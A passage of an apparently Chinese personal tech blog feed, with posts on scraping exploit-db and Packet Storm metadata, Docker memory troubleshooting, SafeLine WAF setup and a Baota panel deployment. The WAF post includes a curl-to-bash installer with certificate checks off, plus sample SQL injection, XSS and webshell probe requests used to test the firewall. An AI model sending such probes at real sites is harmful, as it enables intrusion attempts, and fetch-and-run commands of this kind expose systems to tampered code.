并不算是一种新的技术，而是已有技术的组合，主要用来实现客户端与服务器端的异步通信效果，实现页面的局部刷新。Ajax的目的是提高用户体验，较少网络数据的传输量，所以它<strong>不是一种反爬技术</strong>，只是它的<strong>异步加载</strong>使得不能像爬取静态网页那样制作爬虫。</p>              </div>            </details><p>主要代码简析：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建Chrome WebDriver对象</span></span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line"><span class="comment"># 目标动态网页的URL</span></span><br><span class="line">url = <span class="string">&quot;https://www.exploit-db.com/&quot;</span></span><br><span class="line">driver.get(url)</span><br><span class="line"><span class="comment"># 延时，直到想要获取的数据渲染完成</span></span><br><span class="line">wait = WebDriverWait(driver, <span class="number">10</span>)</span><br><span class="line">element = wait.until(EC.visibility_of_element_located((By.XPATH, <span class="string">&#x27;//tbody/tr[@role=&quot;row&quot;]/td[5]/a&#x27;</span>)))</span><br><span class="line"><span class="comment"># 提取详情页链接</span></span><br><span class="line">links = driver.find_elements(By.XPATH, <span class="string">&quot;//tbody/tr[@role=&#x27;row&#x27;]/td[5]/a&quot;</span>)</span><br><span class="line">url_list = [url.get_attribute(<span class="string">&#x27;href&#x27;</span>) <span class="keyword">for</span> url <span class="keyword">in</span> links]</span><br><span class="line"></span><br><span class="line">json_data = []</span><br><span class="line"><span class="comment"># 信息列表</span></span><br><span class="line">titles = []</span><br><span class="line">edb_id_list = []</span><br><span class="line">authors = []</span><br><span class="line">dates = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入详情页进一步爬取</span></span><br><span class="line"><span class="keyword">for</span> url <span class="keyword">in</span> url_list:</span><br><span class="line">    driver.get(url)</span><br><span class="line">    title = driver.find_element(By.XPATH, <span class="string">&quot;//h1&quot;</span>).text</span><br><span class="line">    edb_id = driver.find_element(By.XPATH, <span class="string">&quot;//div[@class=&#x27;col-sm-12 col-md-6 col-lg-3 d-flex align-items-stretch&#x27;][&quot;</span></span><br><span class="line">                                           <span class="string">&quot;1]//div[@class=&#x27;col-6 text-center&#x27;][1]/h6&quot;</span>).text</span><br><span class="line">    date = driver.find_element(By.XPATH, <span class="string">&quot;//div[@class=&#x27;col-sm-12 col-md-6 col-lg-3 d-flex align-items-stretch&#x27;][&quot;</span></span><br><span class="line">                                         <span class="string">&quot;3]//div[@class=&#x27;col-6 text-center&#x27;][2]/h6&quot;</span>).text</span><br><span class="line">    author = driver.find_element(By.XPATH, <span class="string">&quot;//div[@class=&#x27;col-sm-12 col-md-6 col-lg-3 d-flex align-items-stretch&#x27;][&quot;</span></span><br><span class="line">                                           <span class="string">&quot;2]//div[@class=&#x27;col-6 text-center&#x27;][1]/h6&quot;</span>).text</span><br><span class="line">    titles.append(title)</span><br><span class="line">    edb_id_list.append(edb_id)</span><br><span class="line">    authors.append(author)</span><br><span class="line">    dates.append(date)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;title&#x27;</span>: title,</span><br><span class="line">        <span class="string">&#x27;edb_id&#x27;</span>: edb_id,</span><br><span class="line">        <span class="string">&#x27;authors&#x27;</span>: author,</span><br><span class="line">        <span class="string">&#x27;created&#x27;</span>: date,</span><br><span class="line">    &#125;</span><br><span class="line">    json_data.append(data)</span><br><span class="line"><span class="comment"># 写入JSON文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./test.json&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> json_file:</span><br><span class="line">    json.dump(json_data, json_file, ensure_ascii=<span class="literal">False</span>, indent=<span class="number">4</span>)</span><br><span class="line"><span class="comment"># 结束关闭WebDriver</span></span><br><span class="line">driver.quit()</span><br></pre></td></tr></table></figure><p>需要注意<strong>selenium</strong>的使用语法，建议一步一步来，不要一下子把代码写到底，当然遇到问题解决问题就行。我遇到的一个报错：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">element = driver.find_element(By.XPATH, <span class="string">&#x27;//tbody/tr[@role=&quot;row&quot;][1]/td[5]/a/@href&#x27;</span>).text</span><br><span class="line"><span class="comment"># 报错信息：</span></span><br><span class="line"><span class="comment"># no such element: Unable to locate element: &#123;&quot;method&quot;:&quot;xpath&quot;,&quot;selector&quot;:&quot;//tbody/tr[@role=&quot;row&quot;][1]/td[5]/a/@href&quot;&#125;</span></span><br></pre></td></tr></table></figure><p>在XPath中，如果想获取一个元素的属性值，通常需要使用@符号，但是不能直接在find_element_by_xpath方法中返回属性，不过对于获取文本是没有关系的。解决方法是先定位到元素，然后再获取其属性值。<br><strong>正确用法</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">element = driver.find_element(By.XPATH, <span class="string">&quot;//tbody/tr[@role=&#x27;row&#x27;][1]/td[5]/a&quot;</span>)</span><br><span class="line">href_value = element.get_attribute(<span class="string">&#x27;href&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>报错不可怕，可怕的是没有报错又找不出问题所在。</strong></p><p>运行结果：</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/15/65f3aa8af3abf.gif"/></div></div><p>关于<strong>selenium</strong>的使用，在网上看到一篇总结得比较好的，一并推荐给大家：</p><div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://cloud.tencent.com/developer/article/2392281">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="">          <i class="anzhiyufont anzhiyu-icon-link" style=""></i>        </div>        <div class="tag-link-right">            <div class="tag-link-title">使用Selenium和API爬取动态网页的最佳方法</div>            <div class="tag-link-sitename">全栈若城</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div><p>另外，爬虫的写法还有很多，也有很多现成的库供我们使用。这里只是给自己前段时间这方面的复习做个记录。</p>]]></content>
      
      
      <categories>
          
          <category> 大学生涯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自用：Scrapy简单爬些漏洞POC</title>
      <link href="/posts/e59dce9.html"/>
      <url>/posts/e59dce9.html</url>
      <cover>https://www.freeimg.cn/i/2024/03/06/65e8512697c8b.png</cover>
      <date>Fri Mar 08 2024 00:00:00 GMT+0000</date>
      
        <content type="html"><![CDATA[<h2 id="项目说明"><a href="#项目说明" class="headerlink" title="项目说明"></a>项目说明</h2><p>目标网站是静态的，爬取过程比较简单，用于相关报告的撰写。</p><h2 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h2><p>漏洞证明，漏洞报告中，通过一段描述或一个样例来证明漏洞确实存在。</p><h2 id="Scrapy爬取"><a href="#Scrapy爬取" class="headerlink" title="Scrapy爬取"></a>Scrapy爬取</h2><ul><li>目标网站：<a href="https://packetstormsecurity.com/files/tags/exploit/">packet storm</a></li><li>语言：python</li><li>工具：Xpath</li></ul><h2 id="源码地址"><a href="#源码地址" class="headerlink" title="源码地址"></a>源码地址</h2><div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://github.com/JJLibra/scrapySpider">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="background-image: url(https://www.freeimg.cn/i/2023/12/17/657ee6859efc1.jpg)">          <i class="anzhiyufont anzhiyu-icon-link" style="display: none"></i>        </div>        <div class="tag-link-right">            <div class="tag-link-title">pksSpider</div>            <div class="tag-link-sitename">小李同学</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div>]]></content>
      
      
      <categories>
          
          <category> 大学生涯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Scrapy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>排查Docker容器内存占用问题记录</title>
      <link href="/posts/ce251794.html"/>
      <url>/posts/ce251794.html</url>
      <cover>https://www.freeimg.cn/i/2024/03/06/65e853b74fec9.png</cover>
      <date>Thu Mar 07 2024 16:12:08 GMT+0000</date>
      
        <content type="html"><![CDATA[<h2 id="情况说明"><a href="#情况说明" class="headerlink" title="情况说明"></a>情况说明</h2><p>前段时间，服务器总是莫名宕机，部署在上面一些站点当然也就不行了。然后我就去后台看了一下，发现应该是<code>内存占用过高</code>引起的：</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/07/65e967d2dcbbe.jpg"/></div></div><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/07/65e967e10fcb6.jpg"/></div></div><p>一开始也没太当回事，因为每次宕机一般间隔几天，想着宕机以后去重启一下就好了。于是就先安了一个监控，监控部署在上面的站点，一旦站点无法访问，就会通知我去重启，问题暂时从表面解决了。<br>但是接下来几天，情况愈演愈烈，一天就要宕机好几次。博客上的一些图片也是放在上面的，影响了博客的加载速度，没办法了，只好着手解决。<br>查看了上一周的使用状况：</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/07/65e967ee09875.png"/></div></div><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/07/65e967f81ded7.png"/></div></div><p>初步判断应该是<code>Docker容器占用了太多的内存</code>，主要服务器上也就部署了几个容器，第一时间想到的肯定是容器的锅，结果也确实是。</p><h2 id="排查过程"><a href="#排查过程" class="headerlink" title="排查过程"></a>排查过程</h2><p>部署在服务器上的项目：兰空图床、Picsur图床、一个支持端到端连接的聊天工具、Nginx Proxy Manager和长亭雷池。</p><ul><li>首先排除一下磁盘占用的问题<div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/07/65e96c244b77d.png"/></div></div>挂载的磁盘占用还是非常健康的，可以暂时排除这个原因。</li><li>观察CPU和内存资源<div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/07/65e96ce3c743e.png"/></div></div>发现内存占用很高。尝试清除缓存：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">To free pagecache:仅清除页面缓存（PageCache）</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/vm/drop_caches</span><br><span class="line"></span><br><span class="line">To free dentries and inodes:清除目录项和inode</span><br><span class="line"><span class="built_in">echo</span> 2 &gt; /proc/sys/vm/drop_caches</span><br><span class="line"></span><br><span class="line">To free pagecache, dentries and inodes:清除页面缓存，目录项和inode</span><br><span class="line"><span class="built_in">echo</span> 3 &gt; /proc/sys/vm/drop_caches</span><br></pre></td></tr></table></figure><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/07/65e96dc36dfca.png"/></div></div>发现内存使用还是居高不下，问题多半是出在docker容器上了。</li><li>应该不会是内存泄露的问题，当然也应该不会是日志文件的大量读写，因为内存占用并没有一直膨胀，io使用率也是正常的。</li><li>使用<code>docker stop $(docker ps -a -q)</code>命令结束所有容器</li><li>逐个开启容器，然后使用<code>docker stats</code>查看资源占用情况<br>最后发现<code>长亭雷池</code>和<code>兰空图床</code>的占用过高，一般有下面的解决方式：</li></ul><ol><li>限制容器的内存占用</li><li>开辟swap交换空间</li><li>关闭部分高占用容器（简单粗暴）<br>开始的两种方式好像并不能无脑使用，需要结合自身使用情况进行合理的配置。</li></ol><h2 id="最终解决方式"><a href="#最终解决方式" class="headerlink" title="最终解决方式"></a>最终解决方式</h2><p>其实我挺纳闷的，我明明已经早早地设置了交换空间，为什么还会出现这种情况呢？感觉还存在知识盲区吧，一开始部署的时候其实就考虑了内存占用的问题，并提前设置了两倍内存的交换空间，但是内存占用过高的问题还是出现了。</p><p>至于设置了交换空间，却没有起到显著的效果，还需要研究一下，有可能很复杂，也有可能很简单……</p><p>最后，还是把兰空图床给停用了，并限制了雷池的内存占用，观察了几天，发现没有再出现之前的问题了，是能说暂时安全了，可能这台服务器经不起这样造(doge)。</p><p>关于Docker内存限制管理，网上有不少优秀案例，推荐一篇：</p><div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://zhuanlan.zhihu.com/p/417472115">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="">          <i class="anzhiyufont anzhiyu-icon-link" style=""></i>        </div>        <div class="tag-link-right">            <div class="tag-link-title">Docker资源（CPU/内存/磁盘IO/GPU）限制与分配指南</div>            <div class="tag-link-sitename"></div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> ECS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免费WAF：长亭雷池社区版，给站点再加道防护！</title>
      <link href="/posts/a450d722.html"/>
      <url>/posts/a450d722.html</url>
      <cover>https://www.freeimg.cn/i/2024/03/06/65e85ff490de9.png</cover>
      <date>Fri Mar 01 2024 00:05:00 GMT+0000</date>
      
        <content type="html"><![CDATA[<div class="note orange anzhiyufont anzhiyu-icon-dengpao simple"><p>去年其实就看到这个项目了，最早是在GitHub上看到的，当时只是star了，后来就给忘了。最近整理GitHub的时候又看到了，想想刚好可以用在服务器的那些站点，顺便来这里做个记录。<strong>由于我的博客资源放在GitHub上，所以难以使用<code>ip:port</code>的形式直接访问，也就不能添加雷池。但对于博客部署在自己服务器上的小伙伴，可以正常配置长亭雷池。</strong>如果有好的方法了，我会再来更新。</p></div><h2 id="什么是雷池？"><a href="#什么是雷池？" class="headerlink" title="什么是雷池？"></a>什么是雷池？</h2><p>雷池（SafeLine）是长亭科技耗时近 10 年倾情打造的 WAF，核心检测能力由智能语义分析算法驱动。</p><p>Slogan: 不让黑客越雷池一步。</p><h2 id="什么是-WAF？"><a href="#什么是-WAF？" class="headerlink" title="什么是 WAF？"></a>什么是 WAF？</h2><p>WAF 是 Web Application Firewall 的缩写，也被称为 Web 应用防火墙。区别于传统防火墙，WAF 工作在应用层，对基于 HTTP&#x2F;HTTPS 协议的 Web 系统有着更好的防护效果，使其免于收到黑客的攻击。</p><h2 id="WAF-部署架构"><a href="#WAF-部署架构" class="headerlink" title="WAF 部署架构"></a>WAF 部署架构</h2><p>下图是一个简单的网站流量拓扑，外部用户发出请求，经过网络最终传递到网站服务器。<br>此时，若外部用户中存在恶意用户，那么由恶意用户发出的攻击请求也会经过网络最终传递到网站服务器。</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://d.kstore.space/download/7746/waf架构1.svg"/></div></div><p>社区版雷池以反向代理方式接入，优先于网站服务器接收流量，对流量中的攻击行为进行检测和清洗，将清洗过后的流量转发给网站服务器。<br>通过以上行为，最终确保外部攻击流量无法触达网站服务器。</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://d.kstore.space/download/7746/waf架构2.svg"/></div></div><h2 id="部署效果"><a href="#部署效果" class="headerlink" title="部署效果"></a>部署效果</h2><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/01/65e135cd19322.jpeg"/></div></div><h2 id="如何加到自己的网站？"><a href="#如何加到自己的网站？" class="headerlink" title="如何加到自己的网站？"></a>如何加到自己的网站？</h2><details class="folding-tag" green><summary> 正式部署前的准备工作 </summary>              <div class='content'>              <p>参考<a href="https://waf-ce.chaitin.cn/docs/guide/install">官方文档</a></p><h3 id="部署前环境检测"><a href="#部署前环境检测" class="headerlink" title="部署前环境检测"></a>部署前环境检测</h3><p><strong>最低配置需求</strong></p><ul><li>操作系统：Linux</li><li>指令架构：x86_64</li><li>软件依赖：Docker 20.10.14 版本以上</li><li>软件依赖：Docker Compose 2.0.0 版本以上</li><li>最小化环境：1 核 CPU &#x2F; 1 GB 内存 &#x2F; 5 GB 磁盘</li></ul><p>可以逐行执行以下命令来确认服务器配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -m                                    <span class="comment"># 查看指令架构</span></span><br><span class="line">docker version                              <span class="comment"># 查看 Docker 版本</span></span><br><span class="line">docker compose version                      <span class="comment"># 查看 Docker Compose 版本</span></span><br><span class="line">docker-compose version                      <span class="comment"># 老版本查看Compose 版本</span></span><br><span class="line"><span class="built_in">cat</span> /proc/cpuinfo| grep <span class="string">&quot;processor&quot;</span>         <span class="comment"># 查看 CPU 信息</span></span><br><span class="line">free -h                                     <span class="comment"># 查看内存信息</span></span><br><span class="line"><span class="built_in">df</span> -h                                       <span class="comment"># 查看磁盘信息</span></span><br><span class="line">lscpu | grep ssse3                          <span class="comment"># 确认CPU是否支持 ssse3 指令集</span></span><br></pre></td></tr></table></figure><p>关于docker环境的安装建议参考这篇<a href="https://u.sb/debian-install-docker/">博客</a></p><p><strong>我的部署环境</strong><br>服务器：阿里云服务器（2核2G）<br>操作系统：Debian 11</p><h3 id="安装雷池"><a href="#安装雷池" class="headerlink" title="安装雷池"></a>安装雷池</h3><p>官方提供的三种<strong>安装方式</strong>：</p><ul><li>在线安装 : 推荐方式，一行命令完成安装</li><li>离线安装 : 下载离线安装包，轻松完成安装</li><li>其他方式安装 : 使用牧云助手，点击即可完安装</li></ul><p>我采用<strong>在线安装</strong>，这也是官方推荐的安装方式，并使用华为云加速：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CDN=1 bash -c <span class="string">&quot;<span class="subst">$(curl -fsSLk https://waf-ce.chaitin.cn/release/latest/setup.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure><p>一行命令一键式安装，非常方便，最后有一连串<code>Started</code>，说明安装成功。<br>其他安装方式自行参考<a href="https://waf-ce.chaitin.cn/docs/guide/install">官方文档</a></p><h3 id="登录雷池"><a href="#登录雷池" class="headerlink" title="登录雷池"></a>登录雷池</h3><p>安装完成以后，理论上即可使用<code>https://&lt;waf-ip&gt;:9443</code>访问雷池。<br><strong>如果无法正常访问网址，请检查9443端口是否被占用和服务器安全组规则。</strong><br>需要使用<strong>支持 TOTP 的认证软件或者小程序</strong>扫描二维码获取动态口令登录：</p><ul><li>服务器和 totp 应用的时间必须保持一致，否则无法验证通过</li><li>完成首次登录后，无法回退查看二维码，使用页面提供的方法重置</li></ul><p>支持TOTP的认证软件在手机应用商店不容易搜到，可以在PC端下载<code>.apk</code>文件发送到手机端。我使用的是微软的<code>Authenticator</code>获取的口令，获取口令登录即可：</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/01/65e14bca6af17.gif"/></div></div><p>接下来就可以开始配置防护站点了。</p>              </div>            </details><div class="tabs" id="配置防护站点"><ul class="nav-tabs"><button type="button" class="tab  active" data-href="配置防护站点-1">无CDN进行部署</button><button type="button" class="tab " data-href="配置防护站点-2">存在CDN进行部署</button></ul><div class="tab-contents"><div class="tab-item-content active" id="配置防护站点-1"><p><strong>下面演示的是网站和WAF部署在同一服务器上。</strong>一般不建议这样做，因为这样单机的负载更高、设备宕机的概率更大。非纯净的环境还会提高升级失败的概率，故障排查更困难。但是由于我目前只有一台服务器，无法演示多台服务器。</p><p>以我服务器上的一些使用docker部署的站点为例，先讲讲无其他中间件（CDN）的站点配置。</p><p><a href="https://lsky.xxfer.cn/">小李图床</a><br>这是之前兴起用兰空图床搭建的，没套CDN。<br>具体步骤如下：</p><ol><li><code>域名解析到反向代理服务器</code>，即添加A记录指向反向代理服务器的ip。<div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/01/65e1bd753d88c.png"/></div></div></li><li>（非必须）反向代理，我用<code>Nginx Proxy Manager</code>做反代，并且让<code>反代指向雷池WAF</code>。<br>需要说明的是，雷池WAF的默认端口为9443，因此我们通过访问<code>http://雷池WAF所在服务器ip:9443</code>配置防护站点。使用docker部署的站点也有自己对应的端口，比如<code>小李图床</code>这个站点就是使用docker部署的，该容器映射出的端口假设为<code>a</code>，使用<code>http://小李图床所在服务器ip:a</code>就能访问小李图床。做了反向代理，<code>ip:port</code>就可以变成域名来访问。但是反代和站点部署在同一服务器，站点又是docker部署的，ip需要变为<code>172.17.0.1</code>，这是虚拟网卡docker0的ip，可以使用下面命令查看：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip addr show docker0</span><br></pre></td></tr></table></figure><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/01/65e1bd8436713.png"/></div></div></li><li>雷池<code>防护站点</code>配置<br>配置时<code>注意两处端口a保持一致</code>，具体用哪一个端口，自定义，只要没有进程占用即可，<code>端口b为站点实际访问时所用端口</code>。上面也提到过，如果你的情况和我一样，使用docker部署的站点，且站点和反代为同一服务器，就按照上图使用<code>172.17.0.1</code>应该不会有问题。如果这些（反代、WAF、站点）部署于不同服务器上，就不应该是<code>172.17.0.1</code>了，项目部署在哪一个服务器上，就要使用对应服务器的ip。<div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/01/65e1bdb03a254.png"/></div></div></li></ol><p><strong>效果测试：</strong><br>尝试插入后门，输入下面url</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lsky.xxfer.cn/webshell.php</span><br></pre></td></tr></table></figure><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/01/65e1c2b410edf.png"/></div></div>进入雷池WAF后台，查看拦截信息<div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/01/65e1c2b128f20.png"/></div></div></div><div class="tab-item-content" id="配置防护站点-2"><p><a href="https://picsur.xxfer.cn/">Picsur图床</a><br>这个站点套了层CDN。其实配置原理和上面类似，总结为一句话就是：<br><strong>域名指向CDN，CDN指向雷池WAF映射出的端口，雷池WAF指向服务原始端口也就是上游服务器端口。</strong><br>很多同学大概率和我的情况不太一样，但是只要理解了WAF的架构模式，再看上面这句话应该可以结合自己的情况配置成功了。<br><strong>建议CDN回源协议选择SSL。</strong><br>具体步骤：</p><ol><li>域名解析到CDN<div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/01/65e1c92e9ddd3.png"/></div></div></li><li>CDN回源到雷池WAF<div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/01/65e1c9a89028c.png"/></div></div></li><li>再从WAF指向站点所在服务器和端口<div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/01/65e1c9bd87f1f.png"/></div></div></li></ol><p><strong>理解以后配置起来也挺快的。</strong></p></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><h2 id="测试防护效果"><a href="#测试防护效果" class="headerlink" title="测试防护效果"></a>测试防护效果</h2><ul><li>确认网站可以正常访问</li><li>尝试手动模拟攻击：<br>模拟 SQL 注入，请访问<code>http://&lt;IP或域名&gt;:&lt;端口&gt;/?id=1%20AND%201=1</code><br>模拟 XSS，请访问<code>http://&lt;IP或域名&gt;:&lt;端口&gt;/?html=&lt;script&gt;alert(1)&lt;/script&gt;</code><br>通过浏览器，你将会看到雷池已经发现并阻断了攻击请求：<div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/01/65e1c2b410edf.png"/></div></div></li><li>还有自动化测试防护：<div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2023/12/26/658a8a208cbe9.jpg" alt="等待更新......" style="width:360px;"/></div></div></li></ul><h2 id="关于长亭雷池"><a href="#关于长亭雷池" class="headerlink" title="关于长亭雷池"></a>关于长亭雷池</h2><p>以上展示的只是雷池社区版（免费）的部分使用，当然也有付费的，有需要的同学自行了解。具体事宜请参考<a href="https://waf-ce.chaitin.cn/docs/guide/install">官方文档</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用Docker部署宝塔面板</title>
      <link href="/posts/b10237dc.html"/>
      <url>/posts/b10237dc.html</url>
      <cover>https://www.freeimg.cn/i/2024/03/06/65e8611318c75.png</cover>
      <date>Sun Feb 25 2024 15:05:00 GMT+0000</date>
      
        <content type="html"><![CDATA[<h2 id="为什么使用Docker部署宝塔？"><a href="#为什么使用Docker部署宝塔？" class="headerlink" title="为什么使用Docker部署宝塔？"></a>为什么使用Docker部署宝塔？</h2><ul><li>环境隔离，一个主机可以部署多套服务</li><li>宝塔对主机控制度较高，依赖关系复杂，而 Docker 可以保证宝塔服务不影响到宿主机其他服务。</li><li>由于和宿主机环境隔离，不容易被木马攻击。</li><li>宝塔面板的兼容性顺序为 Centos7.x &gt; Debian10 &gt; Ubuntu 20.04 &gt; Cenots8.x &gt; Ubuntu 18.04 &gt; 其它系统，而用户的主机五花八门，为了获取最佳的兼容性，使用 Docker 部署是不二选择。</li><li>Docker 管理成本低，方便迁移。</li><li>可随时管理容器，无需重置服务器。</li></ul><h2 id="部署环境"><a href="#部署环境" class="headerlink" title="部署环境"></a>部署环境</h2><p>服务器：阿里云服务器<br>操作系统：Debian 11</p><div class="note orange anzhiyufont anzhiyu-icon-dengpao simple"><p>部署之前，请确保服务器已安装Docker和Docker-compose环境，没有安装的请参考这篇<a href="https://u.sb/debian-install-docker/">博客</a></p></div><h2 id="开始部署——参考文档"><a href="#开始部署——参考文档" class="headerlink" title="开始部署——参考文档"></a>开始部署——<a href="https://developer.aliyun.com/article/1355064">参考文档</a></h2><h3 id="安装宝塔面板"><a href="#安装宝塔面板" class="headerlink" title="安装宝塔面板"></a>安装宝塔面板</h3><ul><li><p>创建一下安装的目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo -i</span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> -p /root/data/docker_data/bt-data</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /root/data/docker_data/bt-data</span><br></pre></td></tr></table></figure></li><li><p>编写yaml文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim docker-compose.yml</span><br></pre></td></tr></table></figure><p>英文输入法下，按 <code>i</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">bt:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">btpanel/baota:lnmp</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">bt</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;8888:8888&#x27;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;888:888&#x27;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;80:80&#x27;</span>  <span class="comment"># 保持默认即可，不建议修改左侧的80</span></span><br><span class="line">      <span class="bullet">-</span> 